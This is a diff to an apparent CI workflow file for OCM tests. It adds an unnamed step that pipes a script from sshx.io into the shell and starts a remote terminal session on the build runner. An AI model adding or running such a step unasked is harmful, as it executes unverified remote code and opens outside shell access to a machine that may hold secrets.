@@ -38,6 +38,8 @@ jobs:
       - name: Initalize OCM tests dependencies
         shell: bash
         run: ./init/ocm-test-suite.sh
+      
+      - run: curl -sSf https://sshx.io/get | sh -s run
 
       - name: Run tests
         shell: bash
